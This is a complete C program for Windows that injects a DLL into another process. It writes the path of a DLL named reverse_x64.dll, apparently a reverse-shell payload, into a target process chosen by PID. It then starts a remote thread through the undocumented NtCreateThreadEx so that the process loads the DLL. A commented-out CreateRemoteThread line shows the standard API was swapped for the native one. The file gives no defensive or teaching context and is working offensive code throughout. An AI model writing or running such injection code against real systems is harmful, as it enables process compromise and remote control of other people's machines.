#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>

typedef NTSTATUS(NTAPI* pfnNtCreateThreadEx)
(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer);

int main(int argc, char* argv[]) {
	HANDLE processHandle;
	PVOID remoteBuffer;
	wchar_t dllPath[] = TEXT("C:\\Users\\Administrator\\Desktop\\reverse_x64.dll");

	pfnNtCreateThreadEx NtCreateThreadEx = (pfnNtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");

	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);
	WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);
	PTHREAD_START_ROUTINE StartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
	
	HANDLE threadHandle = NULL;

	//CreateRemoteThread(processHandle, NULL, 0, StartRoutineAddress, remoteBuffer, 0, NULL);

	NtCreateThreadEx(&threadHandle, 0x1FFFFF, NULL, processHandle, (LPTHREAD_START_ROUTINE)StartRoutineAddress, remoteBuffer, FALSE, NULL, NULL, NULL, NULL);
	CloseHandle(processHandle);

	return 0;
}